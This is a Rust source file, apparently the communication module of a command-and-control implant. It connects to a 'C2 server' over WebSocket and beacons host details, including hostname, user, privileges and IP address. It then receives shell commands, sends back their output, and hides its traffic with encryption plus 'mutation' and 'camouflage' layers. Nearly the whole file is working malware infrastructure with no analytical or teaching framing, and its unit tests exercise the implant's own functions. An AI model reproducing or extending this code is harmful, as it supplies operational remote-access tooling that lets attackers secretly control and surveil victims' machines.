use log::{info, error, debug, warn};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::time::{sleep, Duration, timeout};
use tokio::net::TcpStream;
use std::time::SystemTime;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use tokio_tungstenite::{connect_async, MaybeTlsStream, WebSocketStream};
use tokio_tungstenite::tungstenite::protocol::Message as WsMessage;
use futures_util::stream::{SplitSink, SplitStream};
use futures_util::{SinkExt, StreamExt};

use crate::crypto::CryptoManager;
use crate::mutation::MutationEngine;
use crate::camouflage::{TrafficProfile, CamouflageMode};

type WsStream = WebSocketStream<MaybeTlsStream<TcpStream>>;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Message {
    pub msg_type: String,
    pub timestamp: u64,
    pub sequence: u32,
    pub payload: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct BeaconPayload {
    pub agent_id: String,
    pub hostname: String,
    pub os: String,
    pub os_version: String,
    pub architecture: String,
    pub ip_address: Option<String>,
    pub user: Option<String>,
    pub privileges: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct CommandResponse {
    pub command_id: u32,
    pub status: String,
    pub output: String,
    pub error: Option<String>,
    pub execution_time: u64,
}

#[derive(Debug, Serialize, Deserialize)]
struct EncryptedEnvelope {
    v: u8,
    idx: u64,
    data: String,
}

#[derive(Debug, Serialize, Deserialize)]
struct ServerMessage {
    #[serde(rename = "type")]
    msg_type: String,
    data: Option<serde_json::Value>,
}

#[allow(dead_code)]
pub struct Communicator {
    url: String,
    port: u16,
    agent_id: String,
    sequence_number: Arc<RwLock<u32>>,
    reconnect_attempts: Arc<RwLock<u32>>,
    max_reconnect_attempts: u32,
    beacon_interval: u64,
    crypto: Arc<RwLock<CryptoManager>>,
    mutation: Arc<RwLock<MutationEngine>>,
    traffic: Arc<RwLock<TrafficProfile>>,
    session_established: Arc<RwLock<bool>>,
    ws_sink: Arc<RwLock<Option<SplitSink<WsStream, WsMessage>>>>,
    ws_stream: Arc<RwLock<Option<SplitStream<WsStream>>>>,
}

#[allow(dead_code)]
impl Communicator {
    pub fn new(
        url: &str,
        port: u16,
        agent_id: &str,
        beacon_interval: u64,
        crypto: CryptoManager,
        mutation_seed: &[u8; 32],
        camouflage_mode: CamouflageMode,
    ) -> Self {
        let traffic = TrafficProfile::new(camouflage_mode, beacon_interval, mutation_seed);

        Self {
            url: url.to_string(),
            port,
            agent_id: agent_id.to_string(),
            sequence_number: Arc::new(RwLock::new(0)),
            reconnect_attempts: Arc::new(RwLock::new(0)),
            max_reconnect_attempts: 5,
            beacon_interval,
            crypto: Arc::new(RwLock::new(crypto)),
            mutation: Arc::new(RwLock::new(MutationEngine::new(mutation_seed))),
            traffic: Arc::new(RwLock::new(traffic)),
            session_established: Arc::new(RwLock::new(false)),
            ws_sink: Arc::new(RwLock::new(None)),
            ws_stream: Arc::new(RwLock::new(None)),
        }
    }

    pub async fn connect(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("ws://{}:{}/ws/agent/{}", self.url, self.port, self.agent_id);
        info!("Attempting to connect to C2 server: {}", url);

        match timeout(Duration::from_secs(10), self.try_connect(&url)).await {
            Ok(result) => {
                match result {
                    Ok(_) => {
                        info!("Connected to C2 server");
                        let mut attempts = self.reconnect_attempts.write().await;
                        *attempts = 0;

                        self.perform_key_exchange().await?;

                        Ok(())
                    }
                    Err(e) => {
                        error!("Connection error: {}", e);
                        self.handle_reconnect().await
                    }
                }
            }
            Err(_) => {
                error!("Connection timeout");
                self.handle_reconnect().await
            }
        }
    }

    async fn perform_key_exchange(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut crypto = self.crypto.write().await;

        // For now: fall back to PSK-derived session keys
        // TODO: In production, send ECDH payload over WebSocket and complete key exchange
        crypto.init_with_psk()?;

        let mut established = self.session_established.write().await;
        *established = true;

        info!("Encrypted session established (key index: {})", crypto.message_index());
        Ok(())
    }

    async fn try_connect(&self, url: &str) -> Result<(), Box<dyn std::error::Error>> {
        debug!("Connecting to {}", url);

        let (ws, response) = connect_async(url).await
            .map_err(|e| format!("WebSocket connection failed: {}", e))?;

        info!("WebSocket connected (HTTP status: {})", response.status());

        let (sink, stream) = ws.split();

        {
            let mut ws_sink = self.ws_sink.write().await;
            *ws_sink = Some(sink);
        }
        {
            let mut ws_stream = self.ws_stream.write().await;
            *ws_stream = Some(stream);
        }

        Ok(())
    }

    async fn handle_reconnect(&self) -> Result<(), Box<dyn std::error::Error>> {
        // Clear stale WebSocket handles
        {
            let mut sink = self.ws_sink.write().await;
            *sink = None;
        }
        {
            let mut stream = self.ws_stream.write().await;
            *stream = None;
        }

        let mut attempts = self.reconnect_attempts.write().await;

        if *attempts >= self.max_reconnect_attempts {
            *attempts = 0;
            return Err("Max reconnection attempts reached".into());
        }

        *attempts += 1;
        let backoff = Duration::from_secs(2_u64.pow(*attempts));

        info!(
            "Reconnection attempt {}/{}, waiting {}s",
            attempts,
            self.max_reconnect_attempts,
            backoff.as_secs()
        );

        sleep(backoff).await;
        Ok(())
    }

    async fn ws_send(&self, text: &str) -> Result<(), Box<dyn std::error::Error>> {
        let mut sink_guard = self.ws_sink.write().await;
        let sink = sink_guard.as_mut()
            .ok_or("WebSocket not connected")?;

        sink.send(WsMessage::Text(text.to_string())).await
            .map_err(|e| format!("WebSocket send failed: {}", e))?;

        Ok(())
    }

    async fn encrypt_payload(&self, plaintext: &[u8]) -> Result<EncryptedEnvelope, Box<dyn std::error::Error>> {
        let mut mutation = self.mutation.write().await;
        let mutated = mutation.mutate(plaintext)?;
        drop(mutation);

        let mut crypto = self.crypto.write().await;
        let idx = crypto.message_index();
        let encrypted = crypto.encrypt(&mutated)?;

        Ok(EncryptedEnvelope {
            v: 2,
            idx,
            data: BASE64.encode(&encrypted),
        })
    }

    async fn decrypt_payload(&self, envelope: &EncryptedEnvelope) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        if envelope.v != 2 {
            return Err(format!("Unsupported envelope version: {}", envelope.v).into());
        }

        let encrypted = BASE64.decode(&envelope.data)?;
        let mut crypto = self.crypto.write().await;
        let mutated = crypto.decrypt(&encrypted)?;
        drop(crypto);

        let mut mutation = self.mutation.write().await;
        let original = mutation.demutate(&mutated)?;

        Ok(original)
    }

    pub async fn send_beacon(
        &self,
        beacon: &BeaconPayload,
    ) -> Result<String, Box<dyn std::error::Error>> {
        let seq = self.get_next_sequence().await;
        let timestamp = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)?
            .as_secs();

        let message = Message {
            msg_type: "BEACON".to_string(),
            timestamp,
            sequence: seq,
            payload: serde_json::to_string(beacon)?,
        };

        let serialized = serde_json::to_string(&message)?;

        let established = self.session_established.read().await;
        let wire_data = if *established {
            let envelope = self.encrypt_payload(serialized.as_bytes()).await?;
            serde_json::to_string(&envelope)?
        } else {
            serialized.clone()
        };

        self.ws_send(&wire_data).await?;

        debug!("Sent beacon (seq: {}, size: {} bytes, encrypted: {})", seq, wire_data.len(), *established);
        info!("Beacon sent (sequence: {}, encrypted: {})", seq, *established);
        Ok(wire_data)
    }

    pub async fn send_command_result(
        &self,
        response: &CommandResponse,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let seq = self.get_next_sequence().await;
        let timestamp = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)?
            .as_secs();

        let message = Message {
            msg_type: "RESPONSE".to_string(),
            timestamp,
            sequence: seq,
            payload: serde_json::to_string(response)?,
        };

        let serialized = serde_json::to_string(&message)?;

        let established = self.session_established.read().await;
        let wire_data = if *established {
            let envelope = self.encrypt_payload(serialized.as_bytes()).await?;
            serde_json::to_string(&envelope)?
        } else {
            serialized
        };

        self.ws_send(&wire_data).await?;

        debug!("Sent command response (seq: {}, size: {} bytes)", seq, wire_data.len());
        info!("Command response sent (sequence: {}, encrypted: {})", seq, *established);
        Ok(())
    }

    pub async fn next_beacon_interval(&self) -> u64 {
        let mut traffic = self.traffic.write().await;
        traffic.next_beacon_interval()
    }

    pub async fn receive_command(
        &self,
    ) -> Result<Option<String>, Box<dyn std::error::Error>> {
        debug!("Listening for commands from C2 server");

        let mut stream_guard = self.ws_stream.write().await;
        let stream = match stream_guard.as_mut() {
            Some(s) => s,
            None => return Err("WebSocket not connected".into()),
        };

        // Wait for commands with timeout (beacons sent every 15s, so 5s is reasonable)
        match timeout(Duration::from_secs(5), stream.next()).await {
            Ok(Some(Ok(msg))) => {
                match msg {
                    WsMessage::Text(text) => {
                        debug!("Received from server: {} bytes", text.len());
                        self.handle_server_message(&text).await
                    }
                    WsMessage::Binary(data) => {
                        debug!("Received binary from server: {} bytes", data.len());
                        let text = String::from_utf8_lossy(&data).to_string();
                        self.handle_server_message(&text).await
                    }
                    WsMessage::Ping(_) => {
                        debug!("Received ping from server");
                        Ok(None)
                    }
                    WsMessage::Pong(_) => {
                        debug!("Received pong from server");
                        Ok(None)
                    }
                    WsMessage::Close(frame) => {
                        warn!("Server sent close frame: {:?}", frame);
                        Err("Server closed connection".into())
                    }
                    _ => Ok(None),
                }
            }
            Ok(Some(Err(e))) => {
                error!("WebSocket read error: {}", e);
                Err(format!("WebSocket read error: {}", e).into())
            }
            Ok(None) => {
                warn!("WebSocket stream ended (server closed connection)");
                Err("WebSocket stream ended".into())
            }
            Err(_) => {
                // Timeout - no data available, this is normal
                Ok(None)
            }
        }
    }

    async fn handle_server_message(&self, text: &str) -> Result<Option<String>, Box<dyn std::error::Error>> {
        // Handle ACK responses from the current simple server
        if text.starts_with("ACK:") {
            debug!("Received ACK from server");
            return Ok(None);
        }

        // Try to parse as a server command message
        if let Ok(server_msg) = serde_json::from_str::<ServerMessage>(text) {
            match server_msg.msg_type.as_str() {
                "command" => {
                    if let Some(data) = server_msg.data {
                        let cmd_str = serde_json::to_string(&data)?;
                        info!("Received command from server");
                        return Ok(Some(cmd_str));
                    }
                }
                "encrypted_command" => {
                    // Server sent an encrypted envelope
                    if let Ok(envelope) = serde_json::from_str::<EncryptedEnvelope>(text) {
                        let decrypted = self.decrypt_payload(&envelope).await?;
                        let message: Message = serde_json::from_slice(&decrypted)?;
                        info!("Received encrypted command from server");
                        return Ok(Some(message.payload));
                    }
                }
                _ => {
                    debug!("Unknown server message type: {}", server_msg.msg_type);
                }
            }
            return Ok(None);
        }

        // Try to parse as encrypted envelope directly
        if let Ok(envelope) = serde_json::from_str::<EncryptedEnvelope>(text) {
            if envelope.v == 2 {
                let decrypted = self.decrypt_payload(&envelope).await?;
                let message: Message = serde_json::from_slice(&decrypted)?;
                info!("Received encrypted message from server (type: {})", message.msg_type);
                if message.msg_type == "COMMAND" {
                    return Ok(Some(message.payload));
                }
            }
        }

        debug!("Unrecognized server message, ignoring");
        Ok(None)
    }

    async fn get_next_sequence(&self) -> u32 {
        let mut seq = self.sequence_number.write().await;
        *seq += 1;
        *seq
    }

    pub fn get_websocket_url(&self) -> String {
        format!("ws://{}:{}/ws/agent", self.url, self.port)
    }

    pub fn get_agent_id(&self) -> &str {
        &self.agent_id
    }

    pub fn is_connected(&self) -> bool {
        // Synchronous check via try_read
        self.ws_sink.try_read().map_or(false, |g| g.is_some())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_communicator_creation() {
        let key = [42u8; 32];
        let crypto = CryptoManager::new(&key).unwrap();
        let comm = Communicator::new("localhost", 8000, "test-agent-id", 30, crypto, &key, CamouflageMode::None);
        assert_eq!(comm.get_agent_id(), "test-agent-id");
        assert_eq!(comm.url, "localhost");
        assert_eq!(comm.port, 8000);
    }

    #[test]
    fn test_websocket_url() {
        let key = [42u8; 32];
        let crypto = CryptoManager::new(&key).unwrap();
        let comm = Communicator::new("example.com", 443, "agent-123", 30, crypto, &key, CamouflageMode::None);
        assert_eq!(comm.get_websocket_url(), "ws://example.com:443/ws/agent");
    }

    #[tokio::test]
    async fn test_sequence_increment() {
        let key = [42u8; 32];
        let crypto = CryptoManager::new(&key).unwrap();
        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);

        let seq1 = comm.get_next_sequence().await;
        let seq2 = comm.get_next_sequence().await;
        let seq3 = comm.get_next_sequence().await;

        assert_eq!(seq1, 1);
        assert_eq!(seq2, 2);
        assert_eq!(seq3, 3);
    }

    #[tokio::test]
    async fn test_encrypt_decrypt_roundtrip() {
        let key = [42u8; 32];
        let mut crypto = CryptoManager::new(&key).unwrap();
        crypto.init_with_psk().unwrap();
        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);

        {
            let mut established = comm.session_established.write().await;
            *established = true;
        }

        let test_payload = br#"{"msg_type":"BEACON","timestamp":1234,"sequence":1,"payload":"test"}"#;
        let envelope = comm.encrypt_payload(test_payload).await.unwrap();

        assert_eq!(envelope.v, 2);
        assert!(!envelope.data.is_empty());

        // Verify the envelope JSON doesn't leak plaintext
        let envelope_json = serde_json::to_string(&envelope).unwrap();
        assert!(!envelope_json.contains("BEACON"));
        assert!(!envelope_json.contains("test_payload"));
    }

    #[tokio::test]
    async fn test_ws_send_without_connection_fails() {
        let key = [42u8; 32];
        let crypto = CryptoManager::new(&key).unwrap();
        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);

        let result = comm.ws_send("hello").await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not connected"));
    }

    #[tokio::test]
    async fn test_receive_without_connection_fails() {
        let key = [42u8; 32];
        let crypto = CryptoManager::new(&key).unwrap();
        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);

        let result = comm.receive_command().await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_handle_ack_message() {
        let key = [42u8; 32];
        let crypto = CryptoManager::new(&key).unwrap();
        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);

        let result = comm.handle_server_message("ACK:some-data").await.unwrap();
        assert!(result.is_none());
    }

    #[tokio::test]
    async fn test_handle_command_message() {
        let key = [42u8; 32];
        let crypto = CryptoManager::new(&key).unwrap();
        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);

        let msg = r#"{"type":"command","data":{"shell":{"command":"whoami"}}}"#;
        let result = comm.handle_server_message(msg).await.unwrap();
        assert!(result.is_some());
        let cmd = result.unwrap();
        assert!(cmd.contains("whoami"));
    }

    #[tokio::test]
    async fn test_handle_unknown_message() {
        let key = [42u8; 32];
        let crypto = CryptoManager::new(&key).unwrap();
        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);

        let result = comm.handle_server_message("random garbage").await.unwrap();
        assert!(result.is_none());
    }
}
